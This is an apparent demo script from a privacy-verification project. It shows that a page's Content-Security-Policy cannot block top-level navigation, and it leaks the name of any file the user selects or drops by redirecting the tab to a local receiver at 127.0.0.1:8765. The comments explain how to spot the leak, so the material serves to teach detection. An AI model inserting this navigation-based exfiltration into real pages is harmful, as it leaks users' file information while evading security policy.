// =====================================================================================
//  DEMO ONLY - a second way to leak, that the security policy does NOT stop (see docs/verify-privacy.md)
//  build.ps1 injects it at the end of the page to produce corrupted_databrief_navigation.html.
//
//  The page's Content-Security-Policy forbids fetch, XMLHttpRequest, WebSocket, images, scripts and frames.
//  It cannot forbid the page from NAVIGATING: sending the browser tab to another address, with the file name in the URL.
//  Here the tab goes to the demo receiver on your own computer (receiver.py), 127.0.0.1:8765: nothing leaves it.
//
//  What gives it away: the page disappears and the address bar changes, and the Network tab shows a new
//  "document" request. That is why the guide asks you to watch the Network tab, and why the official file is
//  checked with its SHA-256 fingerprint.
// =====================================================================================
(function () {
  function leak(file) {
    if (!file) return;
    window.location.assign('http://127.0.0.1:8765/navigated?name=' + encodeURIComponent(file.name));
  }
  document.addEventListener('change', function (e) {
    if (e.target && e.target.files) leak(e.target.files[0]);
  }, true);
  window.addEventListener('drop', function (e) {
    if (e.dataTransfer && e.dataTransfer.files) leak(e.dataTransfer.files[0]);
  }, true);
})();
